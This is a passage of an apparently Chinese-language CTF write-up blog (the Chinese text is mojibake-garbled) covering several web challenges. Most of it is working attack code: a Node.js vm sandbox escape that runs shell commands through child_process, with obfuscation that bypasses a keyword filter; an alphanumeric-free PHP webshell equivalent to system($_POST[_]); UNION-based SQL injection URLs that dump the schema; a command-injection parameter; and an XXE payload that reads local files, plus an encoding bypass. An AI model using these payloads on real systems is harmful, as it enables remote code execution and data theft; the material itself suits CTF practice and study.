</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">e</span><span class="p">(()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="o">+</span><span class="s1">&#39;)()&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">new</span> <span class="nx">VM</span><span class="p">().</span><span class="nx">run</span><span class="p">(</span><span class="nx">untrusted</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›´æ¥ç”¨ä¼šè¢«waf</p>
<p>è¿‡æ»¤äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">[</span><span class="s1">&#39;for&#39;</span><span class="p">,</span> <span class="s1">&#39;while&#39;</span><span class="p">,</span> <span class="s1">&#39;process&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;constructor&#39;</span><span class="p">,</span> <span class="s1">&#39;prototype&#39;</span><span class="p">,</span> <span class="s1">&#39;Function&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;&#39;]
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å®˜æ–¹wpæ˜¯åœ¨å…³é”®å­—ä¸Šç”¨ä¸¤ä¸ªåå¼•å·ç»•è¿‡,ç„¶åurlç¼–ç ä¸€ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="err">æ¯”å¦‚</span><span class="n">prototypeå˜æˆ</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">y</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">f</span><span class="p">.</span><span class="nf">constructor</span><span class="p">(</span><span class="s2">&#34;return process&#34;</span><span class="p">)();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">f</span><span class="p">[[</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">n</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">u</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">)]([</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">u</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">n</span><span class="o">`</span><span class="p">,</span><span class="o">`%</span><span class="mi">20</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">))();</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">run</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">code</span><span class="o">=</span><span class="p">(()</span><span class="o">=%</span><span class="mi">3</span><span class="n">E</span><span class="err">{</span><span class="o">%</span><span class="mi">20</span><span class="n">TypeError</span><span class="p">[[</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">y</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">)][</span><span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="p">]</span><span class="o">%</span><span class="mi">20</span><span class="o">=%</span><span class="mi">20</span><span class="n">f</span><span class="o">=%</span><span class="mi">3</span><span class="n">Ef</span><span class="p">[[</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">n</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">u</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">)]([</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">u</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">n</span><span class="o">`</span><span class="p">,</span><span class="o">`%</span><span class="mi">20</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">))();</span><span class="o">%</span><span class="mi">20</span><span class="n">try</span><span class="err">{</span><span class="o">%</span><span class="mi">20</span><span class="n">Object</span><span class="p">[</span><span class="o">`</span><span class="n">preventExtensions</span><span class="o">`</span><span class="p">](</span><span class="n">Buffer</span><span class="p">[</span><span class="o">`</span><span class="k">from</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">))[</span><span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="p">]</span><span class="o">%</span><span class="mi">20</span><span class="o">=%</span><span class="mi">201</span><span class="p">;</span><span class="o">%</span><span class="mi">20</span><span class="err">}</span><span class="nf">catch</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="err">{</span><span class="o">%</span><span class="mi">20</span><span class="n">return</span><span class="o">%</span><span class="mi">20</span><span class="n">e</span><span class="p">[</span><span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="p">](()</span><span class="o">=%</span><span class="mi">3</span><span class="n">E</span><span class="err">{}</span><span class="p">)[</span><span class="o">`</span><span class="n">mainModule</span><span class="o">`</span><span class="p">][[</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">q</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">u</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">i</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">)]([</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">h</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">i</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">l</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">d</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">_</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">))[[</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">x</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">S</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">y</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">n</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">)](</span><span class="o">`</span><span class="n">cat</span><span class="o">+%</span><span class="mi">2</span><span class="n">fflag</span><span class="o">`</span><span class="p">)[</span><span class="o">`</span><span class="n">toString</span><span class="o">`</span><span class="p">]();</span><span class="o">%</span><span class="mi">20</span><span class="err">}</span><span class="o">%</span><span class="mi">20</span><span class="err">}</span><span class="p">)()</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¦ä¸€ç§åŠæ³•æ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">prototype</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">`</span><span class="err">${</span><span class="o">`</span><span class="err">${</span><span class="o">`</span><span class="n">prototyp</span><span class="o">`</span><span class="err">}</span><span class="n">e</span><span class="o">`</span><span class="err">}</span><span class="o">`</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æŠŠå…³é”®å­—å…¨éƒ¨æ›¿æ¢æˆè¿™ç§æ ¼å¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">(</span><span class="kd">function</span> <span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">TypeError</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`prototyp`</span><span class="si">}</span><span class="sb">e`</span><span class="si">}</span><span class="sb">`</span><span class="p">][</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`get_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`constructo`</span><span class="si">}</span><span class="sb">r`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`return this.proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">Object</span><span class="p">.</span><span class="nx">preventExtensions</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="sb">``</span><span class="p">)).</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">e</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`get_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">](()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`requir`</span><span class="si">}</span><span class="sb">e`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`child_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">)[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`exe`</span><span class="si">}</span><span class="sb">cSync`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="sb">`whoami`</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="suctf-2018getshell">[SUCTF 2018]GetShell
</h2><p>æ— å­—æ¯æ•°å­—webshell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">=</span><span class="p">[];</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="o">.</span><span class="nv">$_</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">=</span><span class="p">(</span><span class="nv">$_</span><span class="o">==</span><span class="nv">$__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$__</span><span class="o">=</span><span class="p">(</span><span class="nv">$_</span><span class="o">==</span><span class="nv">$_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$___</span> <span class="o">=</span> <span class="o">~</span><span class="nx">åŒº</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">å†ˆ</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">åŒº</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">å‹º</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">çš®</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">é’ˆ</span><span class="p">[</span><span class="nv">$__</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$____</span> <span class="o">=</span> <span class="o">~</span><span class="nx">ç </span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">å¯¸</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">å°</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">æ¬ </span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">ç«‹</span><span class="p">[</span><span class="nv">$__</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$____</span><span class="p">(</span><span class="nv">$$__</span><span class="p">[</span><span class="nx">_</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>system($_POST[_]) </code></p>
<p>è¯»ç¯å¢ƒå˜é‡</p>
<h2 id="b01lers2020life-on-mars">[b01lers2020]Life on Mars
</h2><p>sqlæ³¨å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(schema_name)/**/from/**/information_schema.schemata&amp;{}&amp;_=1745230942307
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&#39;alien_code&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=&#39;code&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(code)from/**/alien_code.code
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="easybypass">EasyBypass
</h2><p>ez</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?comm1=&#34;;sort+/fla?;&#34;&amp;comm2=1
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="æå®¢å¤§æŒ‘æˆ˜-2020roamphp1-welcome">[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome
</h2><p>postä¼ </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">roam1[]=1&amp;roam2[]=2
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="csawqual-2019web_unagi">[CSAWQual 2019]Web_Unagi
</h2><p>æœ‰wafçš„xxe,é¢˜ç›®ç»™æ ¼å¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;users&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;user&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;username&gt;</span>alice<span class="nt">&lt;/username&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;password&gt;</span>passwd1<span class="nt">&lt;/password&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;name&gt;</span>Alice<span class="nt">&lt;/name&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;email&gt;</span>alice@fakesite.com<span class="nt">&lt;/email&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;group&gt;</span>CSAW2019<span class="nt">&lt;/group&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/user&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/users&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›´æ¥å…¨éƒ¨å˜æˆ&amp;xxe;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#39;1.0&#39; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE users [
</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34; &gt;</span>]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;users&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;user&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;username&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/username&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;password&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/password&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;email&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/email&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;group&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/group&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;intro&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/intro&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/user&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/users&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡ŒåŠ çš„introæ˜¯èƒ½è¯»å…¨éƒ¨çš„ï¼Œä½†æ˜¯è¢«wafäº†ï¼Œç¼–ç ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">iconv -f utf8 -t utf-16 2.xml&gt;1.xml
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="mrctf2020ezaudit">[MRCTF2020]Ezaudit
</h2><p>php_mt_seedçˆ†ç§å­</p>
<p>å…ˆå°†å¯†é’¥è½¬æ¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">str1</span><span class="o">=</span><span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">str2</span><span class="o">=</span><span class="s1">&#39;KVQP0LdJKRaV3n9D&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">str3</span> <span class="o">=</span> <span class="n">str1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">str2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">res</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str2</span><span class="p">)):</span>  
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str1</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">str2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">str1</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span>
